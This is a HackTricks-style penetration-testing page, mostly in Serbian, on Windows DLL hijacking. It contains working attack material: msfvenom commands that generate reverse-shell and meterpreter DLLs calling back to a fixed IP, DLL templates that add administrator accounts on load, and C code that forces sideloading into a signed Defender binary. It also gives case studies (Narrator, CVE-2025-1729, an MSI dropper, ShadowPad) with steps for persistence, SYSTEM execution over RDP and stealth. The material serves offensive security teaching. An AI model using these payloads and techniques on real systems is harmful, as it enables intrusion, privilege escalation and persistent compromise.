# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju pouzdanim programom da učita maliciozni DLL. Ovaj termin obuhvata nekoliko taktika poput **DLL Spoofing, Injection, and Side-Loading**. Koristi se prvenstveno za code execution, postizanje persistence, i, ređe, privilege escalation. Iako se ovde fokusiramo na eskalaciju, metoda hijackovanja ostaje ista za različite ciljeve.

### Uobičajene tehnike

Koristi se više metoda za DLL hijacking, a svaka ima različitu efikasnost u zavisnosti od strategije učitavanja DLL-ova koju aplikacija koristi:

1. **DLL Replacement**: Zamena legitimnog DLL-a malicioznim, opcionalno koristeći DLL Proxying da se sačuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicioznog DLL-a u putanju pre legitimnog DLL-a, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje malicioznog DLL-a koji će aplikacija pokušati da učita, misleći da je reč o nepostojećem obaveznom DLL-u.
4. **DLL Redirection**: Izmena parametara pretrage kao što su %PATH% ili .exe.manifest / .exe.local fajlovi da se aplikacija preusmeri na maliciozni DLL.
5. **WinSxS DLL Replacement**: Zamenjivanje legitimnog DLL-a malicioznim u WinSxS direktorijumu, metoda često povezana sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje malicioznog DLL-a u korisnički kontrolisan direktorijum zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.

> [!TIP]
> Za korak-po-korak chain koji ređa HTML staging, AES-CTR config-ove i .NET implants preko DLL sideloading-a, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najčešći način da se pronađu missing Dlls u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, pri čemu treba **podesiti** **sledeća 2 filtera**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i prikazati samo **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **missing dlls in general**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **missing dll** unutar konkretnog izvršnog fajla, treba da dodate još jedan filter kao na primer "Process Name" "contains" `<exec name>`, pokrenete ga i zaustavite hvatanje događaja.

## Exploiting Missing Dlls

Da bismo postigli privilege escalation, najbolja šansa je da možemo da napišemo dll koji će proces sa privilegijama pokušati da učita u nekoj od lokacija koje se pretražuju. Dakle, možemo da upišemo dll u folder koji se pretražuje pre foldera gde je originalni dll (neobičan slučaj), ili možemo da upišemo u folder gde će se dll tražiti, a originalni dll ne postoji ni u jednom folderu.

### Dll Search Order

**Unutar** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se Dlls učitavaju konkretno.**

Windows aplikacije traže DLL-ove prateći skup unapred definisanih putanja pretrage, u određenom redosledu. Problem DLL hijackinga nastaje kada je maliciozni DLL strateški postavljen u jedan od tih direktorijuma tako da bude učitan pre autentičnog DLL-a. Rešenje je osigurati da aplikacija koristi apsolutne putanje kada referencira potrebne DLL-ove.

Možete videti **DLL search order na 32-bit** sistemima ispod:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

To je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**. Kada je isključen, trenutni direktorijum prelazi na drugo mesto. Da biste isključili ovu opciju, kreirajte vrednost registra **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršne module koju **LoadLibraryEx** učitava.

Na kraju, imajte na umu da **dll može biti učitan ukazivanjem apsolutne putanje umesto samo imena**. U tom slučaju taj dll će se pretraživati samo u toj putanji (ako taj dll ima zavisnosti, one će se tražiti kao da su učitane po imenu).

Postoje i drugi načini da se promeni redosled pretrage, ali ih ovde neću objašnjavati.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa je podešavanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa koristeći ntdll native API-je. Pružanjem direktorijuma koji kontroliše napadač ovde, ciljnom procesu koji rešava importovani DLL po imenu (bez apsolutne putanje i bez upotrebe safe loading flag-ova) može se naterati da učita maliciozni DLL iz tog direktorijuma.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Potpuni C primer: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavite maliciozni xmllite.dll (koji eksportuje potrebne funkcije ili prosleđuje pozive pravom DLL-u) u vaš direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji je poznato da traži xmllite.dll po imenu koristeći gore opisanu tehniku. Loader rešava import putem navedenog DllPath-a i sideloads vaš DLL.

Ova tehnika je primećena u prirodi da pokreće višestepene sideloading lance: inicijalni launcher ispušta pomoćni DLL, koji zatim pokreće Microsoft-signed, hijackable binarni fajl sa prilagođenim DllPath-om kako bi primorao učitavanje DLL-a napadača iz staging direktorijuma.


#### Izuzeci u redosledu pretrage DLL-ova iz Windows dokumentacije

U Windows dokumentaciji su zabeleženi određeni izuzeci od standardnog redosleda pretrage DLL-ova:

- Kada se naiđe na **DLL koji deli ime sa nekim već učitanim u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, izvršava proveru za redirekciju i manifest pre nego što podrazumevano upotrebi DLL koji je već u memoriji. **U tom scenariju, sistem ne vrši pretragu za DLL**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će iskoristiti svoju verziju tog known DLL-a, zajedno sa bilo kojim njegovim zavisnim DLL-ovima, **odustajući od procesa pretrage**. Registry ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži spisak ovih known DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za tim zavisnim DLL-ovima se vrši kao da su naznačeni samo po njihovim **module names**, bez obzira na to da li je početni DLL bio identifikovan putem pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **drugačijim privilegijama** (horizontalno ili lateralno kretanje), a kojem **nedostaje DLL**.
- Obezbedite da imate **write access** na bilo koji **direktorijum** u kojem će se **DLL** **tražiti**. Ovo mesto može biti direktorijum izvršnog fajla ili direktorijum unutar system path-a.

Da, zahtevi su komplikovani za naći jer je **po defaultu prilično čudno naći privilegovani izvršni fajl kome nedostaje dll** i još je **čudnije imati write permisije na folder u system path-u** (po defaultu ne možete). Ali, u pogrešno konfiguriranim okruženjima ovo je moguće.\
U slučaju da imate sreće i ispunjavate zahteve, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Čak i ako je **glavni cilj projekta bypass UAC**, tamo možete naći **PoC** Dll hijaking-a za verziju Windows-a koju možete iskoristiti (verovatno samo menjajući putanju foldera na kojem imate write permisije).

Imajte na umu da možete **proveriti svoje permisije u folderu** radeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proveri dozvole svih direktorijuma unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports of an executable i exports of a dll pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič kako da **abuse Dll Hijacking to escalate privileges** kada imate dozvole za upis u **System Path folder** pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za upis u bilo koji folder unutar system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Primer

Ako pronađete iskoristiv scenario, jedna od najvažnijih stvari za uspešno iskorišćavanje je da **napravite dll koji eksportuje bar sve funkcije koje će executable importovati iz njega**. Imajte na umu da Dll Hijacking može biti koristan da se [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili da se pređe [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **how to create a valid dll** možete naći u ovoj studiji o dll hijackingu fokusiranoj na izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Štaviše, u **sledećem odeljku** možete naći neke **osnovne dll kodove** koji mogu biti korisni kao **templates** ili za kreiranje **dll-a koji eksportuje neobavezne funkcije**.

## **Kreiranje i kompajliranje Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **izvrši vaš maliciozni kod pri učitavanju**, ali i da **izloži** i **radi** kako se očekuje **prosljeđujući sve pozive stvarnoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti an executable and select the library** koju želite proxify i **generisati a proxified dll** ili **navesti the Dll** i **generisati a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86, nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaš sopstveni

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora **export several functions** koje će biti učitane od strane victim process. Ako te functions ne postoje, **binary won't be able to load** njih i **exploit will fail**.

<details>
<summary>C DLL predložak (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje proverava predvidljivi, jezički-specifičan localization DLL pri pokretanju koji može biti hijacked za arbitrary code execution i persistence.

Ključne činjenice
- Putanja provere (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Nasleđena putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji upisiva DLL pod kontrolom napadača, ona se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Exporti nisu potrebni.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja prethodno navedene putanje.

Minimalna DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Kao običan korisnik, ubaci `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekaj da se zakazani zadatak pokrene u 9:30 pod kontekstom trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL se pokreće u administratorskoj sesiji sa srednjim integritetom.
4. Kombinuj standardne UAC bypass tehnike da biste podigli privilegije sa srednjeg integriteta na SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Chain overview
- Korisnik preuzme MSI. A CustomAction se pokreće tiho tokom GUI instalacije (npr. LaunchApplication ili VBScript action), rekonstruirajući narednu fazu iz ugrađenih resursa.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se potpisani EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz radnog direktorijuma, izvršavajući napadačev kod pod potpisanim roditeljem (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Traži unose koji pokreću izvršne fajlove ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji izvršava ugrađeni fajl u pozadini.
- U Orca (Microsoft Orca.exe), inspektuj CustomAction, InstallExecuteSequence i Binary tabele.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Traži više malih fragmenata koji su spojeni i dešifrovani od strane VBScript CustomAction. Uobičajen tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Postavite ove dve datoteke u isti direktorijum:
- wsc_proxy.exe: legitiman potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: maliciozni DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; inače, napravite proxy DLL i prosledite potrebne exports pravoj biblioteci dok izvršavate payload u DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za export, koristite proxying framework (npr., DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika zavisi od rešavanja imena DLL-a od strane host binarnog fajla. Ako host koristi apsolutne putanje ili safe loading flags (npr., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS i forwarded exports mogu uticati na prioritet i moraju se uzeti u obzir pri izboru host binarnog fajla i skupa export-a.

## Potpisane triade + enkriptovani payloadi (studija slučaja ShadowPad)

Check Point je opisao kako Ink Dragon deploy-uje ShadowPad koristeći **triadu od tri fajla** da se uklopi u legitimni softver, dok osnovni payload ostaje enkriptovan na disku:

1. **Signed host EXE** – dobavljači kao što su AMD, Realtek ili NVIDIA su zloupotrebljeni (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršni fajl da izgleda kao Windows binarni (na primer `conhost.exe`), ali Authenticode potpis ostaje validan.
2. **Malicious loader DLL** – ispušten pored EXE-a sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuskovan ScatterBrain framework-om; njegov jedini zadatak je da pronađe enkriptovani blob, dekriptuje ga i reflectively map-uje ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-mapping-a dekriptovanog payload-a, loader briše TMP fajl da uništi forenzičke tragove.

Napomene o tradecraft-u:

* Preimenovanje potpisanog EXE-a (pri čuvanju originalnog `OriginalFileName` u PE header-u) omogućava da se preruši kao Windows binarni fajl, a da zadrži vendor potpis, pa replicirajte Ink Dragon-ovu naviku ispuštanja binarnih koje liče na `conhost.exe`, a zapravo su AMD/NVIDIA utiliti.
* Pošto izvršni fajl ostaje trusted, većina allowlisting kontrola obično zahteva samo da vaš zlonamerni DLL stoji pored njega. Fokusirajte se na prilagođavanje loader DLL-a; potpisani parent obično može da radi nepromenjen.
* ShadowPad-ov decryptor očekuje da TMP blob bude pored loader-a i da bude writable kako bi mogao da obriše fajl nakon mapiranja. Držite direktorijum upisivim dok se payload ne učita; kad je u memoriji, TMP fajl može bezbedno biti obrisan radi OPSEC-a.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
